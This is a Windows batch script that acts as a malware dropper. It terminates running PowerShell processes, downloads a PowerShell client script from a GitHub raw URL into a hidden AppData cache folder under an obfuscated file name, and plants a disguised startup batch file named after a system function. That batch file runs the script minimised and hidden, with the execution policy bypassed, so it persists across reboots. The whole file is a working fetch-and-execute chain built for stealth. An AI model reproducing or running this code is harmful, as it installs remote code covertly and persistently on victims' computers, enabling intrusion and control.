@echo off

:: Set the URL, temporary folder name, and process name
set url=https://raw.githubusercontent.com/jh1sc/Conex/main/Clientv3.1.ps1
set tmpfolder=%appdata%\.cache
set process=powershell.exe

:: Check if any PowerShell processes are running and kill them
tasklist /FI "IMAGENAME eq %process%" | find /i "%process%" > nul && taskkill /f /im "%process%"

:: Create the temporary folder if it doesn't exist
if not exist %tmpfolder% mkdir %tmpfolder%

:: Download the file and save it in the temporary folder
powershell -command "(New-Object System.Net.WebClient).DownloadFile('%url%', '%tmpfolder%\0xP81s3_1.ps1')"

:: Create the batch file in the startup directory to run the PowerShell script
echo @echo off > "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\RtlAllocateHeap_0b1100110x1.bat"
echo start /b /min powershell -windowstyle hidden -executionpolicy bypass -file "%tmpfolder%\0xP81s3_1.ps1" >> "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\RtlAllocateHeap_0b1100110x1.bat"
echo exit 0 >> "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\RtlAllocateHeap_0b1100110x1.bat"

:: Run the batch file to execute the PowerShell script
call "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\RtlAllocateHeap_0b1100110x1.bat"
